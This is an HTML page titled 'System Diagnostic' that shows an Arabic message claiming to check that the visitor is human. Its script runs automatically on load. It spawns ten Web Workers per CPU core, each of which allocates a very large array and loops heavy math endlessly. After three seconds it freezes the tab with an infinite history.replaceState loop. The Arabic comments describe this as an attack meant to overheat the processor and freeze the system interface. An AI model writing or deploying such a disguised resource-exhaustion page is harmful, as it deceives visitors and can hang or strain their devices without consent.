<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>System Diagnostic</title>
</head>
<body style="background:#111; color:#0f0; text-align:center; font-family:monospace; padding-top:100px;">
    <h2 id="log">جاري التحقق من انك انسان ...</h2>
    <div id="cores"></div>

    <script>
        // 1. تحديد عدد الأنوية وديناميكية العمل
        const physicalCores = navigator.hardwareConcurrency || 4;
        const threadCount = physicalCores * 10; // فتح ضعف عدد الأنوية لضمان الاختناق
        document.getElementById('cores').innerText = "الأنوية المكتشفة: " + physicalCores + " | المسارات المفعلة: " + threadCount;

        // 2. كود الـ Worker المصمم لإجبار التربو (Turbo Boost)
        const workerCode = `
            self.onmessage = function() {
                // مصفوفة ضخمة لإشغال الكاش والرام
                let memoryLoad = new Float64Array(200000000); 
                
                function crunch() {
                    // عمليات رياضية معقدة (Trigonometric & Exponential) لإجبار وحدة الحساب (ALU) على العمل الأقصى
                    for (let i = 0; i < 500000000; i++) {
                        Math.tan(Math.atan(Math.tan(Math.atan(Math.random()))));
                        Math.exp(Math.random()) * Math.sqrt(Math.random());
                    }
                    // منع الـ Garbage Collection من إراحة المعالج
                    memoryLoad.fill(Math.random());
                    setTimeout(crunch, 0); // تكرار فوري
                }
                crunch();
            };
        `;

        const blob = new Blob([workerCode], {type: 'application/javascript'});
        const workerUrl = URL.createObjectURL(blob);

        function startHyperStress() {
            document.getElementById('log').innerText = " ...";
            
            // 3. إطلاق الهجوم المتوازي على كافة الأنوية
            for (let i = 0; i < threadCount; i++) {
                const w = new Worker(workerUrl);
                w.postMessage("go");
            }

            // 4. تجميد واجهة النظام (System UI Freeze)
            // بعد 7 ثواني من رفع التردد والحرارة، نقوم بتجميد مسار الواجهة
            setTimeout(() => {
                document.getElementById('log').innerText = "CRITICAL_SYSTEM_OVERLOAD";
                while(true) {
                    // تكرار طلبات تغيير الهوية البصرية للمتصفح لإرباك معالج الرسوميات والنظام
                    history.replaceState(null, "", "OVERLOAD_" + Date.now() + "_" + Math.random());
                }
            }, 3000);
        }

        // بدء التشغيل
        window.onload = startHyperStress;
    </script>
</body>
</html>
